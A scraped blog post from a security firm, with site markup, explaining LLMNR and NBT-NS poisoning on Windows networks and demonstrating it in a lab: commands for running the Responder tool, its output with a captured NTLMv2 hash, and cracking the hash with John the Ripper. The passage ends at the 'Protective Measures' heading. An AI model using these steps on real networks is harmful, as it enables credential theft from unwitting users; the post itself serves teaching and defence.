+	    	<div class="octf-search octf-btn-cta">
+				<div class="toggle-search octf-cta-icons">
+					<i class="flaticon-search"></i>
+				</div>
+				<!-- Form Search on Header -->
+				<div class="h-search-form-field">
+					<div class="h-search-form-inner">
+						<form role="search" method="get" class="search-form" action="https://www.sternsecurity.com/" >
+    <label><span class="screen-reader-text">Search for:</span>
+    <input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" /></label>
+	<button type="submit" class="search-submit"><i class="flaticon-search"></i></button>
+    </form>					</div>									
+				</div>
+			</div>
+		    
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-2d3490c6 ot-column-items-center ot-flex-column-horizontal" data-id="2d3490c6" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-1bd34bdf elementor-position-left elementor-vertical-align-middle top-rht-hdr-tel elementor-view-default elementor-widget elementor-widget-icon-box" data-id="1bd34bdf" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+								</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span >Have Any Questions?</span>
+				</h3>
+								<p class="elementor-icon-box-description"><a href="tel:9198867685">919.886.7685</a></p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-11482d6c elementor-widget elementor-widget-ibutton" data-id="11482d6c" data-element_type="widget" data-widget_type="ibutton.default">
+				<div class="elementor-widget-container">
+					<div class="ot-button">
+			<a href="https://www.sternsecurity.com/contact/" class="octf-btn octf-btn-primary">Need Help?</a>
+	    </div>
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+		</div>    <!-- #header-desktop-close -->
+
+    <!-- #header-mobile-open -->
+    <div class="header-mobile">		<div data-elementor-type="wp-post" data-elementor-id="2854" class="elementor elementor-2854" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-55212198 is-fixed ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="55212198" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-4cdb5f0b ot-flex-column-vertical" data-id="4cdb5f0b" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-524c330e elementor-widget elementor-widget-ilogo" data-id="524c330e" data-element_type="widget" data-widget_type="ilogo.default">
+				<div class="elementor-widget-container">
+						
+	    	<div class="the-logo">
+				<a href="https://www.sternsecurity.com/">
+					<img src="https://sternsecurity.wpengine.com/wp-content/uploads/2020/11/logo_full-reverse-small.png" alt="Stern Security">
+				</a>			        
+		    </div>
+		    
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2df0dc0f ot-flex-column-horizontal" data-id="2df0dc0f" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-6b4d4c31 elementor-widget elementor-widget-isearch" data-id="6b4d4c31" data-element_type="widget" data-widget_type="isearch.default">
+				<div class="elementor-widget-container">
+						
+	    	<div class="octf-search octf-btn-cta">
+				<div class="toggle-search octf-cta-icons">
+					<i class="flaticon-search"></i>
+				</div>
+				<!-- Form Search on Header -->
+				<div class="h-search-form-field">
+					<div class="h-search-form-inner">
+						<form role="search" method="get" class="search-form" action="https://www.sternsecurity.com/" >
+    <label><span class="screen-reader-text">Search for:</span>
+    <input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" /></label>
+	<button type="submit" class="search-submit"><i class="flaticon-search"></i></button>
+    </form>					</div>									
+				</div>
+			</div>
+		    
+	    		</div>
+				</div>
+				<div class="elementor-element elementor-element-38196644 elementor-widget elementor-widget-imenu_mobile" data-id="38196644" data-element_type="widget" data-widget_type="imenu_mobile.default">
+				<div class="elementor-widget-container">
+						
+	    	<div class="octf-menu-mobile octf-cta-header">
+				<div id="mmenu-toggle" class="mmenu-toggle">
+					<button></button>
+				</div>
+				<div class="site-overlay mmenu-overlay"></div>
+				<div id="mmenu-wrapper" class="mmenu-wrapper on-right">
+					<div class="mmenu-inner">
+						<a class="mmenu-close" href="#"><i class="flaticon-right-arrow-1"></i></a>
+						<div class="mobile-nav">
+							<ul id="menu-top-navigation" class="mobile_mainmenu none-style"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2978"><a href="https://www.sternsecurity.com/">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2994"><a href="https://www.sternsecurity.com/services/">Cybersecurity Services</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3286"><a href="https://www.sternsecurity.com/blog/portfolio/velocity/">Security Posture</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3287"><a href="https://www.sternsecurity.com/blog/portfolio/penetration-testing/">Penetration Testing</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3288"><a href="https://www.sternsecurity.com/blog/portfolio/data-security-consulting/">Data Security Consulting</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3289"><a href="https://www.sternsecurity.com/blog/portfolio/virtual-security-officer/">Virtual Security Officer</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3370"><a href="#">Company</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3369"><a href="https://www.sternsecurity.com/about-us/">About Us</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3371"><a href="https://www.sternsecurity.com/careers/">Careers</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3368"><a href="#">Latest News &#038; Blog</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-2982"><a href="https://www.sternsecurity.com/blog/">Blog</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3006"><a href="https://www.sternsecurity.com/in-the-news/">In The News</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3024"><a href="https://www.sternsecurity.com/publications/">Publications</a></li>
+</ul>
+</li>
+<li class="has-subnav-special menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3078"><a href="#">Tools</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3003"><a target="_blank" rel="noopener" href="https://www.healthcarebreaches.com/">Healthcare Breach Analysis</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3004"><a target="_blank" rel="noopener" href="https://github.com/sternsecurity/">GitHub</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2983"><a href="https://www.sternsecurity.com/contact/">Contact</a></li>
+</ul>						</div>   	
+					</div>   	
+				</div>
+			</div>
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+		</div>    <!-- #header-mobile-close -->
+
+</header>
+<!-- #site-header-close -->
+<!-- #side-panel-open -->
+    <div id="side-panel" class="side-panel ">
+        <a href="#" class="side-panel-close"><i class="flaticon-close"></i></a>
+        <div class="side-panel-block">
+            		<div data-elementor-type="wp-post" data-elementor-id="2856" class="elementor elementor-2856" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-97bff10 ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="97bff10" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-3b0fcfbf ot-flex-column-vertical" data-id="3b0fcfbf" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-5b0ca0a2 elementor-widget elementor-widget-ilogo" data-id="5b0ca0a2" data-element_type="widget" data-widget_type="ilogo.default">
+				<div class="elementor-widget-container">
+						
+	    	<div class="the-logo">
+				<a href="https://www.sternsecurity.com/">
+					<img src="https://engitech.s3.amazonaws.com/images/logo.svg" alt="Stern Security">
+				</a>			        
+		    </div>
+		    
+	    		</div>
+				</div>
+				<div class="elementor-element elementor-element-10eebe7 elementor-widget elementor-widget-text-editor" data-id="10eebe7" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+					<p>Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-36f1ca99 elementor-widget elementor-widget-heading" data-id="36f1ca99" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h4 class="elementor-heading-title elementor-size-default">Gallery</h4>		</div>
+				</div>
+				<div class="elementor-element elementor-element-a841864 elementor-widget elementor-widget-image-gallery" data-id="a841864" data-element_type="widget" data-widget_type="image-gallery.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image-gallery">
+			<div id='gallery-1' class='gallery galleryid-2970 gallery-columns-3 gallery-size-engitech-portfolio-thumbnail-grid'><figure class='gallery-item'>
+			<div class='gallery-icon portrait'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project11" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project11.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project11-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project11-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project11-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure><figure class='gallery-item'>
+			<div class='gallery-icon portrait'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project10" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project10.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project10-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project10-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project10-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure><figure class='gallery-item'>
+			<div class='gallery-icon portrait'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project4" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project4.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project4-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project4-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project4-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure><figure class='gallery-item'>
+			<div class='gallery-icon portrait'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project6" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project6.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project6-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project6-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project6-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure><figure class='gallery-item'>
+			<div class='gallery-icon portrait'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project2" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project2.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project2-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project2-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project2-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure><figure class='gallery-item'>
+			<div class='gallery-icon landscape'>
+				<a data-elementor-open-lightbox="yes" data-elementor-lightbox-slideshow="a841864" data-elementor-lightbox-title="project1" href='https://www.sternsecurity.com/wp-content/uploads/2019/11/project1.jpg'><img width="720" height="720" src="https://www.sternsecurity.com/wp-content/uploads/2019/11/project1-720x720.jpg" class="attachment-engitech-portfolio-thumbnail-grid size-engitech-portfolio-thumbnail-grid" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2019/11/project1-720x720.jpg 720w, https://www.sternsecurity.com/wp-content/uploads/2019/11/project1-150x150.jpg 150w" sizes="(max-width: 720px) 100vw, 720px" /></a>
+			</div></figure>
+		</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-5f98745a elementor-widget elementor-widget-heading" data-id="5f98745a" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h4 class="elementor-heading-title elementor-size-default">Contacts</h4>		</div>
+				</div>
+				<div class="elementor-element elementor-element-101d8395 elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="101d8395" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-map-marker-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span ></span>
+				</h3>
+								<p class="elementor-icon-box-description">411 University St, Seattle, USA</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-3c6a17b7 elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="3c6a17b7" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-envelope"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span ></span>
+				</h3>
+								<p class="elementor-icon-box-description"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ff9a9198968b9a9c97bf909c9a9e918b979a929a8cd1919a8b">[email&#160;protected]</a></p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-38207ad elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="38207ad" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-phone-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span ></span>
+				</h3>
+								<p class="elementor-icon-box-description">+1 -800-456-478-23</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-15ddcfde elementor-shape-circle elementor-grid-4 e-grid-align-left elementor-widget elementor-widget-social-icons" data-id="15ddcfde" data-element_type="widget" data-widget_type="social-icons.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-social-icons-wrapper elementor-grid">
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-animation-float elementor-repeater-item-a24d46e" href="#" target="_blank">
+						<span class="elementor-screen-only">Twitter</span>
+						<i class="fab fa-twitter"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook-f elementor-animation-float elementor-repeater-item-4261f62" href="#" target="_blank">
+						<span class="elementor-screen-only">Facebook-f</span>
+						<i class="fab fa-facebook-f"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-pinterest-p elementor-animation-float elementor-repeater-item-b0dbeaa" href="#" target="_blank">
+						<span class="elementor-screen-only">Pinterest-p</span>
+						<i class="fab fa-pinterest-p"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram elementor-animation-float elementor-repeater-item-6b456a7" href="#" target="_blank">
+						<span class="elementor-screen-only">Instagram</span>
+						<i class="fab fa-instagram"></i>					</a>
+				</div>
+					</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+			
+        </div>
+    </div>
+<!-- #side-panel-close -->
+	<div id="content" class="site-content">
+	        
+            <div class="page-header flex-middle"  style="background-image: url(https://www.sternsecurity.com/wp-content/themes/engitech/images/bg-pheader.jpg);" >
+                <div class="container">
+                    <div class="inner flex-middle">
+                                                    <h1 class="page-title">Blog Post</h1>
+                        <ul id="breadcrumbs" class="breadcrumbs none-style"><li><a href="https://www.sternsecurity.com">Home</a></li><li><a href="https://www.sternsecurity.com/blog/">Blog</a></li><li><a href="https://www.sternsecurity.com/blog/category/llmnr/">LLMNR</a></li><li class="active">Local Network Attacks: LLMNR and NBT-NS Poisoning</li></ul>    
+                            </div>
+                </div>
+            </div>
+        	<div class="entry-content">
+		<div class="container">
+			<div class="row">
+				<div id="primary" class="content-area col-lg-9 col-md-9 col-sm-12 col-xs-12">
+					<main id="main" class="site-main">
+						
+					
+ 
+
+<article id="post-2970" class="blog-post post-box post-2970 post type-post status-publish format-standard has-post-thumbnail hentry category-llmnr category-nbtns category-netbios-name-service category-metasploit category-responder category-research">
+    
+            <div class="entry-media">
+                <div class="post-cat"><span class="posted-in"><a href="https://www.sternsecurity.com/blog/category/llmnr/" rel="category tag">LLMNR</a> <a href="https://www.sternsecurity.com/blog/category/nbtns/" rel="category tag">NBTNS</a> <a href="https://www.sternsecurity.com/blog/category/netbios-name-service/" rel="category tag">Netbios Name Service</a> <a href="https://www.sternsecurity.com/blog/category/metasploit/" rel="category tag">Metasploit</a> <a href="https://www.sternsecurity.com/blog/category/responder/" rel="category tag">Responder</a> <a href="https://www.sternsecurity.com/blog/category/research/" rel="category tag">Research</a></span></div>                <img width="782" height="782" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg 782w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-300x300.jpg 300w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-150x150.jpg 150w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-768x768.jpg 768w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-720x720.jpg 720w" sizes="(max-width: 782px) 100vw, 782px" />            </div>
+            
+            <div class="inner-post">
+        <header class="entry-header">
+
+                        <div class="entry-meta">
+                <span class="posted-on">_ <a href="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/" rel="bookmark"><time class="entry-date published" datetime="2013-11-16T00:00:00+00:00">November 16, 2013</time></a></span><span class="byline">_ <a class="url fn n" href="https://www.sternsecurity.com/blog/author/sternsecurity/">Webmaster</a></span>            </div><!-- .entry-meta -->
+            
+            <h1 class="entry-title">Local Network Attacks: LLMNR and NBT-NS Poisoning</h1>
+        </header><!-- .entry-header -->
+
+        <div class="entry-summary">
+
+            
+<figure class="wp-block-image size-large"><img loading="lazy" width="782" height="782" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg" alt="" class="wp-image-2971" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg 782w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-300x300.jpg 300w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-150x150.jpg 150w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-768x768.jpg 768w, https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L-720x720.jpg 720w" sizes="(max-width: 782px) 100vw, 782px" /></figure>
+
+
+
+<h3>Background</h3>
+
+
+
+<p>How can an attacker capture usernames and passwords on a local network by simply waiting for the computers to willingly give them up? &nbsp;LLMNR and NBT-NS poisoning!<br><br>Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines. &nbsp;LLLMNR was introduced in Windows Vista and is the successor to NBT-NS.</p>
+
+
+
+<p>They are both seemingly innocuous components which allow machines on the same subnet help each other identify hosts when DNS fails. &nbsp;So if one machine tries to resolve a particular host, but DNS resolution fails, the machine will then attempt to ask all other machines on the local network for the correct address via LLMNR or NBT-NS.<br><br>This seems harmless in theory, but it opens up a major vulnerability that attackers can use to gain full credentials to a system.</p>
+
+
+
+<h3>Vulnerability</h3>
+
+
+
+<p>An attacker can listen on a network for these LLMNR (UDP/5355) or NBT-NS (UDP/137) broadcasts and respond to them, thus pretending that the attacker knows the location of the requested host. &nbsp;</p>
+
+
+
+<p><strong>Let’s look at an example in the diagram below. &nbsp;</strong></p>
+
+
+
+<ol><li>The victim machine wants to go the print server at \\printserver, but mistakenly types in \\pintserver. &nbsp;</li><li>2. The DNS server responds to the victim saying that it doesn’t know that host.</li><li>3. The victim then asks if there is anyone on the local network that knows the location of \\pintserver</li><li>4. The attacker responds to the victim saying that it is the \\pintserver</li><li>5. The victim believes the attacker and sends its own username and NTLMv2 hash to the attacker.</li><li>6. The attacker can now crack the hash to discover the password</li></ol>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="807" height="511" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/llmnr_poison1.jpg" alt="" class="wp-image-2972" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/llmnr_poison1.jpg 807w, https://www.sternsecurity.com/wp-content/uploads/2020/11/llmnr_poison1-300x190.jpg 300w, https://www.sternsecurity.com/wp-content/uploads/2020/11/llmnr_poison1-768x486.jpg 768w, https://www.sternsecurity.com/wp-content/uploads/2020/11/llmnr_poison1-720x456.jpg 720w" sizes="(max-width: 807px) 100vw, 807px" /></figure>
+
+
+
+<h3>Attack Tools</h3>
+
+
+
+<p>There are several tools that will allow you to act out the attack scenario detailed above. &nbsp;One of the originals is NBNSpoof by Wesley McGrew (<a rel="noreferrer noopener" href="http://www.mcgrewsecurity.com/tools/nbnspoof/" target="_blank">http://www.mcgrewsecurity.com/tools/nbnspoof/</a>). &nbsp;McGrew explains his website how to create a tool to carry out such attack. &nbsp;Metasploit has a LLMNR Spoofer module auxiliary/spoof/llmnr/llmnr_response (<a rel="noreferrer noopener" href="http://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response" target="_blank">http://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response</a>). &nbsp;The tool we will use today is “Responder” from SpiderLabs (<a rel="noreferrer noopener" href="https://github.com/SpiderLabs/Responder.git" target="_blank">https://github.com/SpiderLabs/Responder.git</a>).&nbsp;</p>
+
+
+
+<p>1. Download the Responder software:&nbsp;<strong>git clone https://github.com/SpiderLabs/Responder.git</strong></p>
+
+
+
+<p>2. Run the Responder help menu: <strong>python Responder.py -h</strong> </p>
+
+
+
+<p>Notice a couple mandatory options:</p>
+
+
+
+<p>-i [IP] : the attacker’s IP address (or the IP address to send the traffic to)<br>-b [0/1]:&nbsp;Set this to 1 if you want to return a Basic HTTP&nbsp;authentication. 0 will return an NTLM&nbsp;authentication.</p>
+
+
+
+<p><br>In addition to those options, there are many switches which allow you to turn on or off various services to poison &#8211; http, https, smb, sql, ftp, ldap, dns, etc… &nbsp;</p>
+
+
+
+<p>Let’s follow the example in the image above. &nbsp;</p>
+
+
+
+<p>1. &nbsp;To set things up, the attacker at 192.168.1.77 starts responder with “<strong>python Responder.py -I eth0 -wfv</strong>”. &nbsp;</p>
+
+
+
+<pre class="wp-block-code"><code>#python Responder.py -I eth0 7 -wfv
+NBT Name Service/LLMNR Answerer 1.0.
+To kill this script hit CRTL-C
+
+&#91;+]NBT-NS &amp; LLMNR responder started
+Global Parameters set
+Challenge set is: 1122334455667788
+WPAD Proxy Server is:On
+HTTP Server is:ON
+SMB Server is:ON
+SQL Server is:ON
+FTP Server is:ON
+DNS Server is:ON
+LDAP Server is:ON
+FingerPrint Module is:OFF </code></pre>
+
+
+
+<p>2.  The victim at 192.168.1.74 tries to go to \\pintserver which doesn’t exist.<br>3. &nbsp;The victim asks anyone on the local network for help identifying the \\pintserver<br>4. &nbsp;The attacker responds<br>5. &nbsp;The victim sends their credentials to the attacker.</p>
+
+
+
+<pre class="wp-block-code"><code>LLMNR poisoned answer sent to this IP: 192.168.1.74. The requested name was : pintserver.
+&#91;+]SMB-NTLMv2 hash captured from :  192.168.1.74
+Domain is : WORKGROUP
+User is : testuser
+&#91;+]SMB complete hash is : testuser::WORKGROUP:  
+1122334455667788:834735BBB9FBC3B168F1A721C5888E39:01010000000000004F51B4E9FADFCE01A7ABBB61969951540000000002000A0073006D006200310032000100140053004500520056004500520032003000300038000400160073006D006200310032002E006C006F00630061006C0003002C0053004500520056004500520032003000300038002E0073006D006200310032002E006C006F00630061006C000500160073006D006200310032002E006C006F00630061006C000800300030000000000000000000000000200000DFEC64C689142E250762FE31AD029114A4DFF12665D21124ED6C5111BA7D86710A0010000000000000000000000000000000000009001E0063006900660073002F00700069006E0074007300650072007600650072000000000000000000 </code></pre>
+
+
+
+<p>6.  The Responder program stores the credentials in a file in the local directory called SMB-NTLMv2-Client-192.168.1.74.txt<br>7.  The Attacker runs john the ripper against the file with the “<strong>john SMB-NTLMv2-Client-192.168.1.74.txt</strong>” command and John the Ripper immediately discovers the password of “password1”</p>
+
+
+
+<pre class="wp-block-code"><code>#john SMB-NTLMv2-Client-192.168.1.74.txt  
+Loaded 1 password hash (NTLMv2 C/R MD4 HMAC-MD5 &#91;32/64])
+password1        (testuser)
+guesses: 1  time: 0:00:00:00 DONE (Tue Nov 12 15:56:46 2013)  c/s: 114620  trying: 123456 - crawford
+Use the "--show" option to display all of the cracked passwords reliably </code></pre>
+
+
+
+<h3>Packet Capture</h3>
+
+
+
+<p>Let’s look at what’s happening at the network level.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="319" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture-1024x319.png" alt="" class="wp-image-2974" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture-1024x319.png 1024w, https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture-300x93.png 300w, https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture-768x239.png 768w, https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture-720x224.png 720w, https://www.sternsecurity.com/wp-content/uploads/2020/11/LLMNR-packetcapture.png 1154w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<ol><li>You can see the victim at 192.168.1.74 making a name query to the DNS server for “pintserver”.</li><li>The DNS doesn’t know the host.</li><li>The victim then makes a LLMNR broadcast for “pintserver”.</li><li>The attacker at 192.168.1.77 responds.</li><li>The victim creates an SMB connection to the attacker and sends its username and password hash.</li></ol>
+
+
+
+<h3>Protective Measures</h3>
+
+
+
+<p>Fixing the issue is easy. &nbsp;</p>
+
+
+
